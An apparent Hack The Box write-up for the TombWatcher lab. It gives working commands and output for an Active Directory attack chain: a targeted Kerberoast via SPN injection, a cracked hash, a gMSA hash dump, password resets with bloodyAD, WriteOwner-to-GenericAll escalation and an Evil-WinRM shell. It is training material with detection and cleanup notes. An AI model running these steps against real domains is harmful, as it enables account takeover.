

> **Missing screenshot:** Alt TombWatcher. Original: `/Images//TombWatcher.png`. Restore to `images/TombWatcher.png`.


# Windows Medium 

## Assumed Breach Starting Point

This engagement follows an **assume breach** model.

> As is common in real-world Windows penetration tests, you begin the *TombWatcher* assessment with valid user credentials.

### Cracked Hashes

- **Username:** `alfred`
- **Password** `basketball`

### Provided Credentials

- **Username:** `henry`
- **Password:** `H3nry_987TGV!`

These initial credentials simulate an attacker with access to a compromised low-privilege domain account. The objective is to pivot from this foothold toward privilege escalation and domain dominance.


## Nmap Scan: tombwatcher.htb

**Command:**
```bash
sudo nmap tombwatcher.htb -Pn -T5 -sV -A -sC
```

**Scan Date:** 2025-06-27  
**Target:** `tombwatcher.htb (10.10.11.72)`  
**Latency:** 0.078s  
**Filtered Ports:** 987 TCP ports (no-response)

---

### Open Ports and Services

| Port     | State | Service         | Version                                              |
|----------|-------|------------------|------------------------------------------------------|
| 53/tcp   | open  | domain           | Simple DNS Plus                                      |
| 80/tcp   | open  | http             | Microsoft IIS httpd 10.0                             |
| 88/tcp   | open  | kerberos-sec     | Microsoft Windows Kerberos                           |
| 135/tcp  | open  | msrpc            | Microsoft Windows RPC                                |
| 139/tcp  | open  | netbios-ssn      | Microsoft Windows netbios-ssn                        |
| 389/tcp  | open  | ldap             | Windows AD LDAP (tombwatcher.htb0., Default Site)    |
| 445/tcp  | open  | microsoft-ds?    | Unknown                                              |
| 464/tcp  | open  | kpasswd5?        | Unknown                                              |
| 593/tcp  | open  | ncacn_http       | Microsoft Windows RPC over HTTP 1.0                  |
| 636/tcp  | open  | ssl/ldap         | Windows AD LDAP over SSL                             |
| 3268/tcp | open  | ldap             | Windows AD Global Catalog                            |
| 3269/tcp | open  | ssl/ldap         | Windows AD Global Catalog over SSL                   |
| 5985/tcp | open  | http             | Microsoft HTTPAPI httpd 2.0                          |

---

### HTTP Observations (Port 80 & 5985)

- **HTTP Title:** IIS Windows Server (Port 80)
- **HTTP Methods:** `TRACE` enabled (potentially risky)
- **HTTPAPI/2.0 on Port 5985:** Title: Not Found

---

### SSL Certificate Info (LDAP over SSL)

- **CN:** `DC01.tombwatcher.htb`
- **Valid:** `2024-11-16` to `2025-11-16`
- **SAN:** DNS: `DC01.tombwatcher.htb`

---

### OS Detection

- **Likely OS:** Microsoft Windows Server 2019 or Windows 10 (accuracy ~97%)
- **Distance:** 2 hops
- **Device Type:** General purpose server

---

## Host Script Results

- <span style="color:red;"><strong>[WARNING]</strong></span> Clock Skew: ~4 hours fast  
- <strong>[INFO]</strong> SMB2 Time: <code>2025-06-27T12:10:19</code>  
- <strong>[SECURITY]</strong> SMB2 Signing: Enabled and required

---

## Traceroute (Port 445)

```text
1   77.25 ms 10.10.14.1
2   78.77 ms tombwatcher.htb (10.10.11.72)
```

---

> **Note:** OS scan results may be unreliable due to limited open/closed port info.  
> Consider submitting inaccuracies to: [nmap.org/submit](https:MACHINES/nmap.org/submit)


```bash
┌──(jrios㉿warmonger)-[~/Documents/HTB]
└─$ sudo nmap tombwatcher.htb -Pn -T5 -sV -A -sC
[sudo] password for jrios: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 01:09 PDT
Nmap scan report for tombwatcher.htb (10.10.11.72)
Host is up (0.078s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-27 12:09:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-27T12:10:59+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-27T12:10:59+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-27T12:10:59+00:00; +3h59m59s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-27T12:10:59+00:00; +4h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| smb2-time: 
|   date: 2025-06-27T12:10:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   77.25 ms 10.10.14.1
2   78.77 ms tombwatcher.htb (10.10.11.72)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.85 seconds
```

## Bloodhound-Python
Lets run some bloodhound!


> **Missing screenshot:** Alt Henry to Alfred. Original: `/Images/alfred-tombwatcher.png`. Restore to `images/alfred-tombwatcher.png`.


### Command Used

```bash
faketime 'now + 4 hours' bloodhound-python \
  -u henry \
  -p 'H3nry_987TGV!' \
  -d tombwatcher.htb \
  -gc tombwatcher.htb \
  -c all \
  -ns 10.10.11.72
```

### Purpose

This command performs full collection (`-c all`) using BloodHound-python on the `tombwatcher.htb` Active Directory domain. The user `henry` is a low-privileged domain user simulating an assumed breach scenario.

####  Resolution Steps

1. **Add host entries to `/etc/hosts`** to ensure local name resolution:

    ```bash
    sudo nano /etc/hosts
    ```

    Add the following line:

    ```
    10.10.11.72 tombwatcher.htb tombwatcher dc01.tombwatcher.htb
    ```

2. **Specify the DNS nameserver** using the `-ns` flag:

    ```bash
    -ns 10.10.11.72
    ```

3. **Use full FQDN** (`tombwatcher.htb`) for both `-d` and `-gc` options.

---

### BloodHound Output Summary

- **AD Domain Found:** tombwatcher.htb
- **LDAP Server:** dc01.tombwatcher.htb
- **Users:** 9
- **Groups:** 53
- **GPOs:** 2
- **OUs:** 2
- **Containers:** 19
- **Computers:** 1 (DC01)
- **Trusts:** 0
- **Duration:** ~18 seconds

# BloodHound Finding: WriteSPN Privilege from HENRY to ALFRED

## Initial Access

We began the assessment with **assumed breach credentials** for the low-privileged domain user:

- **Username:** `henry@tombwatcher.htb`
- **Password:** `H3nry_987TGV!`

These credentials allowed successful enumeration of the domain using `bloodhound-python`.

---

## BloodHound Graph Analysis

The BloodHound graph reveals the following key relationship:

- **Source Node:** `HENRY@TOMBWATCHER.HTB`
- **Target Node:** `ALFRED@TOMBWATCHER.HTB`
- **Edge Type:** `WriteSPN`

This means the `henry` user has **WriteServicePrincipalName** rights over the `alfred` user object in Active Directory.


> **Missing screenshot:** Alt BloodHound File Ingestion. Original: `/Images/WriteSPN.png`. Restore to `images/WriteSPN.png`.


---

## Exploitation Path

This privilege enables a **targeted Kerberoast attack** against the `alfred` account using `targetedKerberoast.py`.

### Attack Command:

```bash
targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -t alfred
```

This will:

- Set a dummy SPN on the `alfred` account
- Request a Kerberos service ticket (TGS)
- Dump the ticket in hash format
- Allow offline password cracking of `alfred`’s credentials

---

## Summary

This misconfiguration allows privilege escalation from `henry` to `alfred`, assuming the latter's password can be cracked. This is a common AD abuse path that should be mitigated by restricting unnecessary SPN write permissions on user accounts.

# BloodHound Finding: WriteSPN Privilege from HENRY to ALFRED

## Initial Access

We began the assessment with **assumed breach credentials** for the low-privileged domain user:

- **Username:** `henry@tombwatcher.htb`
- **Password:** `H3nry_987TGV!`

These credentials allowed successful enumeration of the domain using `bloodhound-python`.

---

## BloodHound Graph Analysis

The BloodHound graph reveals the following key relationship:

- **Source Node:** `HENRY@TOMBWATCHER.HTB`
- **Target Node:** `ALFRED@TOMBWATCHER.HTB`
- **Edge Type:** `WriteSPN`

This means the `henry` user has **WriteServicePrincipalName** rights over the `alfred` user object in Active Directory.

---

## Exploitation Path

This privilege enables a **targeted Kerberoast attack** against the `alfred` account using `targetedKerberoast.py`. In this case I used a custom command to target one account only.

### Attack Command:

```bash
ldapmodify -x -D "henry@tombwatcher.htb" -w 'H3nry_987TGV!' -H ldap://10.10.11.72 <<EOF
dn: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb
changetype: modify
add: servicePrincipalName
servicePrincipalName: HackThePlannet/netSec
EOF

# Output of a succesfull command.
modifying entry "CN=Alfred,CN=Users,DC=tombwatcher,DC=htb"

```

Then:
```
bash
faketime 'now + 4 hours' impacket-GetUserSPNs tombwatcher.htb/henry:'H3nry_987TGV!' -dc-ip 10.10.11.72 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  ------  --------  --------------------------  ---------  ----------
fake/httpservice      Alfred            2025-05-12 08:17:03.526670  <never>               


[-] CCache file is not found. Skipping...
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$3e68f31da55a6e0bd7cddba2da11a749$2d543aa4635c8fdffef28cac887dae5958606b76cae2ce12c899968ac11fdda9a6a5e2a392534b16fe99ec7ca582fb1f22a99b712b7b4967f268eddc85aaf219a0f9111759c3a3c4c9247c86f33034f08c4b1c501f5ad4a6027fa7ec351e538ce594f3d0ef9c6b13d3547c8378b5ad7cc23eb1c47e07b9041f3169971b521f05c90729786648a60e40e14a29f2c9fc8a1ca7909f59e28ad8aceac007b92a746fbcd7e68de1afa1f63001387119a479ab4a194854102d20524ac38e3406d65c1bfdea389baf9d7a0521261290a2060aa8a2e5b17d5f6514b2f2a79a79a018a988361672ddfed9b1e64285a89bf630f94dac2a2a664fd957d08f1b4e67ec0e8b02daf26dd8fb454b8943d480aafd86d4db6e93aa9bd0ec6b2a644e7104836758367f846d42a30f1e918ee50b499764d2f62f220bf86d591df8d3da447eeaeac6df63d610a87819042b8baa6c120eae03a56f538cadfb8df0aa92383a196b5bee4e45abd30997b25a0737b4ce9e0e8db74c9cb8c8b461655ddbf237816549b5ca26dad9b1ddfaca246044a667b26fa5d44461a6f547bd437ca3659d143c8b7196d4880d58676ccdc31e4457a2d88cacfde12997f3cd740ad4432c8eee2c9b2a9eb7e543c57f25fc66483265f6d3e0ce9e0e071619daea270065f403431046a553396c66db951741d60ba1a1441e43daa1e7b0e4a4cd2ab1ce3c6fa138394f814071eb4850589c819b9922af7b02bb0952fbe62817030f57481f5090767574cf582879ee41f60cf9f92d522718e4541de4573e89844c3914cb99a2746480fc84e63505aa771285a5beacc277870a6a177c5e679cb829e88de7fe867f71828515d1800f2328d2a03a26cf431a5168184494edd7a3471f51062b2577118a5f2e46174cccde7e31f0e2cfad3698740f59e1b104580206a26b8f1a6c406ff4b60aaedc21f23f9ac49d0f07c39716c7162a27d19087af8f22a2c213acaa1ee95f9aec65680ac6abd506026910e5649ca8fe15355fa7e0b80734cc0391cefce8755e08c075b1babaf0574a9ffa2c332a78a8817772bed89f6de5f669ac85de75f21a07f1c7ff5032088f977ac70551151f1976a0cfaf3f7932ca4ae5075c335b3b92a5dfb30e156c50826215b08bd3a835e6059ce46d554e4162ff44c1a769f9cdd519dfac5cb1c515eafe0d4582e91727207a04b8753df1a398e5de1c49dc31644d6b0594ea059a225bff60d7a1c6662af2b82b7a04c276dc33f2d3267293b2657e9dddd8c37c6b35b73a688999bfbe40630648ccefbd5840ee8f22d3af5b4d7e02ec00c3b46ffd062c72e6f83d234aea8c7cf8130f5d4693d1f156a5c3f212eb87a26f4fccb7c5580bd7726eb62d85def3ecfc2febe032a5644a723345077221e94e47fa0f27fcf9d22b229d01d4f58c53e217c94c4c05967268a48848783a7b6590d58176a6d716745d08bdbd5a0f0c14b7237a45e53d3a81:basketball
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...3d3a81
Time.Started.....: Mon Jun 30 20:42:19 2025 (0 secs)
Time.Estimated...: Mon Jun 30 20:42:19 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   108.0 MH/s (4.34ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1310720/14344385 (9.14%)
Rejected.........: 0/1310720 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> saytrang
Hardware.Mon.#01.: Temp: 50c Fan: 14% Util: 54% Core:2610MHz Mem:1000MHz Bus:16

Started: Mon Jun 30 20:42:03 2025
Stopped: Mon Jun 30 20:42:20 2025
```

---

## Goal

Successfully cracking this hash reveals the plaintext password for the `alfred` account, which can then be used for lateral movement or privilege escalation in an Active Directory environment.


### Privilege Escalation via Group Membership

- **User:** `ALFRED@TOMBWATCHER.HTB`
- **Target Group:** `INFRASTRUCTURE@TOMBWATCHER.HTB`

**Key Points**

1. `ALFRED` can add itself to the `INFRASTRUCTURE` security group.  
2. Security group delegation means every member inherits the group’s privileges.  
3. After joining, `ALFRED` will hold all permissions already assigned to `INFRASTRUCTURE@TOMBWATCHER.HTB`.


## 1. Add **ALFRED** to the **INFRASTRUCTURE** Group


> **Missing screenshot:** Adding ALFRED. Original: `/Images/alfred-tombwatcher.png`. Restore to `images/alfred-tombwatcher.png`.


### Command
```bash
faketime 'now + 4 hours' \
bloodyAD --host tombwatcher.htb -d tombwatcher \
-u alfred -p basketball \
add groupMember 'infrastructure' 'alfred'
```

**Result**
```text
[+] alfred added to infrastructure
```

### Quick Reference
- **Tool:** `bloodyAD`  
- **Host/DC:** `tombwatcher.htb`  
- **Domain:** `tombwatcher`  
- **Group modified:** `infrastructure`  
- **Event generated:** 4728 (member added to security-enabled global group)  
- **OpSec:** Use `bloodyAD` or PowerView instead of `net.exe` to reduce command-line logging noise.

---

## 2. Dump gMSA Credentials with NetExec


> **Missing screenshot:** gMSA Enumeration. Original: `Images/infra-to-ansible.png`. Restore to `images/infra-to-ansible.png`.


### Command
```bash
netexec ldap tombwatcher.htb -u alfred -p basketball --gmsa
```

**Sample Output**
```text
Account: ansible_dev$  NTLM: 4b21348ca4a9edff9689cdf75cbda439
PrincipalsAllowedToReadPassword: Infrastructure
```

---

## 3. Read gMSA Password with BloodyAD (Kerberos)

```bash
bloodyAD --host tombwatcher.htb --dc-ip 10.10.11.72 \
-d tombwatcher.htb -k \
get object 'ansible_dev$' --attr msDS-ManagedPassword
```

Returns the managed-password blob containing clear text, NT hash, and AES keys.

---

## 4. Detection Cheat Sheet

| Technique                       | Windows Event ID |
|---------------------------------|------------------|
| Group membership change         | 4728 |
| Password reset                  | 4738 |
| gMSA password read (LDAP)       | 4662 |
| Scheduled task creation         | 4698 |
| Service creation                | 7045 |

---

**Always rotate credentials and lock down ACLs after testing.**


# BloodyAD Password Reset via NTLM Hash  

## Command Used
```bash
# NTLM (no Kerberos) – hash supplied as RC4 key
bloodyAD --host tombwatcher.htb --dc-ip 10.10.11.72 \
-d tombwatcher.htb \
-u ansible_dev\$ \
-p :4b21348ca4a9edff9689cdf75cbda439 \
set password 'sam' 'DeadSecOps'
```

**Output**
```text
[+] Password changed successfully!
```

## Why This Works
| Aspect | Detail |
|--------|--------|
| **Authentication** | NTLM over LDAP. The NT hash is treated as an RC4 session key (`-p :<NTHASH>`). |
| **Privileges Needed** | The authenticating account (`ansible_dev$`) must have **ResetPassword** or broader rights on `sam`. |
| **No Kerberos Required** | Omitting `-k` skips Kerberos; useful when only the NT hash is available. |
| **Bash Escaping** | The `$` in `ansible_dev$` is escaped (`\$`) to prevent variable expansion. |

## Detection
| Event ID | Description |
|----------|-------------|
| **4738** | “A user’s basic information was changed” — fired on the DC for `sam`. |

## OpSec Notes
* LDAPS (`-s`) can encrypt traffic to avoid plaintext NTLM exposure.  
* Password complexity and history policies still apply.  

---

**Always clean up test accounts and rotate service passwords after demonstrations.**

# Escalation via WriteOwner then GenericAll


> **Missing screenshot:** Sam to JOhn. Original: `/Images/sam-to-john.png`. Restore to `images/sam-to-john.png`.


## Scenario

We control **SAM@TOMBWATCHER.HTB**. BloodHound shows SAM has the **WriteOwner** right on **JOHN@TOMBWATCHER.HTB**.  
Goal: give SAM full control over JOHN so we can reset JOHN's password or delegate further rights.

---

## Step 1 – Take Ownership

```bash
faketime 'now + 4 hours' \
bloodyAD --host tombwatcher.htb --dc-ip 10.10.11.72 \
-d tombwatcher.htb \
-u sam -p 'DeadSecOps' \
set owner 'john' 'sam'
```

Output:

```
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

**What happened**

* `set owner` updates the `nTSecurityDescriptor.Owner` field of JOHN's object.
* SAM already had **WriteOwner** so the DC allowed the change.
* Once SAM becomes owner, he automatically receives **WRITE_DACL** on the object.

---

## Step 2 – Add GenericAll

```bash
faketime 'now + 4 hours' \
bloodyAD --host tombwatcher.htb --dc-ip 10.10.11.72 \
-d tombwatcher.htb \
-u sam -p 'DeadSecOps' \
add genericAll 'john' 'sam'
```

Output:

```
[+] sam has now GenericAll on john
```

**What happened**

* Using WRITE_DACL, SAM appends an ACE that grants himself **GenericAll** (Full Control) over JOHN.
* SAM can now reset JOHN's password, enable RBCD, or delegate any other right.

---

## Why this two step process is required

1. **WriteOwner** alone does not let you edit the DACL.  
2. After you become owner you gain **WRITE_DACL**.  
3. With WRITE_DACL you can insert an ACE for GenericAll, effectively giving full control.

---

## Detection Events

| Event | Description |
|-------|-------------|
| 4670  | Permissions on an object were changed (step 2) |
| 4738  | If you later reset JOHN's password |
| 4728  | If JOHN is added to a privileged group |

---

## Cleanup

Reverse the changes to reduce noise:

```bash
# Remove GenericAll ACE
bloodyAD remove genericAll 'john' 'sam'

# Restore original owner (SID shown in step 1)
bloodyAD set owner 'john' 'S-1-5-21-1392491010-1358638721-2126982587-512'
```

Always document the original DACL before making changes.


# Resetting JOHN's Password with BloodyAD

## Context
* **SAM** previously gained **GenericAll** on **JOHN** by first taking ownership and then updating the DACL.
* With GenericAll, SAM can now reset JOHN's password using `bloodyAD`.

## Command Used
```bash
faketime 'now + 4 hours' \
bloodyAD --host tombwatcher.htb --dc-ip 10.10.11.72 \
-d tombwatcher.htb \
-u sam -p 'DeadSecOps' \
set password 'john' 'DeadSecOps'
```

**Output**
```text
[+] Password changed successfully!
```

## What Happened
* `set password` replaces **JOHN**'s `unicodePwd` attribute.
* Because SAM has **GenericAll** on JOHN's object, this LDAP modify succeeds.
* The new password **DeadSecOps** complies with complexity policies on the domain.

## Detection
| Event ID | Description |
|----------|-------------|
| **4738** | “A user's basic information was changed” – fires on the Domain Controller that processed the password reset. |

## Next Steps
* Authenticate as JOHN with the new credentials to access additional resources:
  ```bash
  crackmapexec smb 10.10.11.72 -u john -p 'DeadSecOps' -d tombwatcher.htb
  ```
* Use JOHN's privileges for lateral movement or further enumeration.

## Cleanup
If this was a lab test, reset JOHN's password back to its original value or require a password change at next logon.

# Notes: Gaining Shell Access via Evil-WinRM

## Command Used

```bash
evil-winrm -i 10.10.11.72 -u john -p DeadSecOps
```

---

## What Happens

- **Tool:** [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (Windows Remote Management shell for penetration testing)
- **Target:** `10.10.11.72` (domain host)
- **User:** `john`
- **Password:** `DeadSecOps`
- **Purpose:** Establish an interactive PowerShell session as the specified user.

---

## Example Output

```
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents>
```

---

## Summary

- **Success:** You have established an interactive PowerShell session as `john` on the remote Windows host.
- **Prompt:** The `*Evil-WinRM* PS C:\Users\john\Documents>` prompt confirms a live shell.
- **Next Steps:** You can now run PowerShell commands, upload/download files, enumerate, and attempt privilege escalation as needed.

---

## Troubleshooting

- If you see host resolution errors, ensure `/etc/hosts` maps the target IP to its hostname.
- For advanced usage (e.g., uploading scripts, using Kerberos tickets, specifying domains), see the [Evil-WinRM documentation](https://github.com/Hackplayers/evil-winrm).

---

# Notes: Enumerating Deleted AD Objects (Tombstones) with PowerShell

## Command Used

```powershell
Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects -Properties *
```

---

## What Happened

- Queried Active Directory for all **deleted objects** ("tombstones") in the domain.
- Returned objects from the **Deleted Objects** container, including deleted user accounts.

---

## Key Findings

### Deleted Objects Container

- **DistinguishedName:** `CN=Deleted Objects,DC=tombwatcher,DC=htb`
- **Description:** Default container for deleted objects
- **IsCriticalSystemObject:** True
- **isDeleted:** True

<pre> 
```
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects -Properties *


CanonicalName                   : tombwatcher.htb/Deleted Objects
CN                              : Deleted Objects
Created                         : 11/15/2024 7:01:41 PM
createTimeStamp                 : 11/15/2024 7:01:41 PM
Deleted                         : True
Description                     : Default container for deleted objects
DisplayName                     :
DistinguishedName               : CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {12/31/1600 7:00:00 PM}
instanceType                    : 4
isCriticalSystemObject          : True
isDeleted                       : True
LastKnownParent                 :
Modified                        : 11/15/2024 7:56:00 PM
modifyTimeStamp                 : 11/15/2024 7:56:00 PM
Name                            : Deleted Objects
ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
ObjectClass                     : container
ObjectGUID                      : 34509cb3-2b23-417b-8b98-13f0bd953319
ProtectedFromAccidentalDeletion :
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
systemFlags                     : -1946157056
uSNChanged                      : 12851
uSNCreated                      : 5659
whenChanged                     : 11/15/2024 7:56:00 PM
whenCreated                     : 11/15/2024 7:01:41 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
CN                              : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
codePage                        : 0
countryCode                     : 0
Created                         : 11/15/2024 7:55:59 PM
createTimeStamp                 : 11/15/2024 7:55:59 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/15/2024 7:57:59 PM
modifyTimeStamp                 : 11/15/2024 7:57:59 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1109
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133761921597856970
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 12975
uSNCreated                      : 12844
whenChanged                     : 11/15/2024 7:57:59 PM
whenCreated                     : 11/15/2024 7:55:59 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
CN                              : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:04:05 PM
createTimeStamp                 : 11/16/2024 12:04:05 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:04:21 PM
modifyTimeStamp                 : 11/16/2024 12:04:21 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762502455822446
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13171
uSNCreated                      : 13161
whenChanged                     : 11/16/2024 12:04:21 PM
whenCreated                     : 11/16/2024 12:04:05 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM

``` </pre>

---

